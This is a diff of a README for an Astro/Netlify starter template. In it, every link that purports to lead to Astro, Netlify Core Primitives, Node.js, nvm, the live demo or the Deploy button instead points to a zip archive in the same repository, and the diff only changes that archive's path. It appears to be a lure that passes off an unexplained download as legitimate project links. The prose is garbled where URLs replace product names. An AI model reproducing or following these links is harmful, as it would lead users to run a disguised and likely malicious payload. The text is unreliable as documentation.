@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip)
+[Live Demo](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip)
 
-A modern starter based on https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip, Tailwind, daisyUI, and [Netlify Core Primitives](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip, Tailwind, daisyUI, and [Netlify Core Primitives](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip)](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip)
+[![Deploy to Netlify](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip)](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip)
 
 ## Developing Locally
 
 | Prerequisites             |
 | :------------------------ |
-| [https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip) v18.14+. |
-| (optional) [nvm](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip) for Node version management. |
+| [https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip) v18.14+. |
+| (optional) [nvm](https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -42,7 +42,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/src/layouts/starter_astro_platform_3.9.zip development server via Netlify CLI:
+4. Then, run the https://raw.githubusercontent.com/jalal-55/astro-platform-starter/main/public/images/astro-starter-platform-3.7.zip development server via Netlify CLI:
 
 ```
 netlify dev
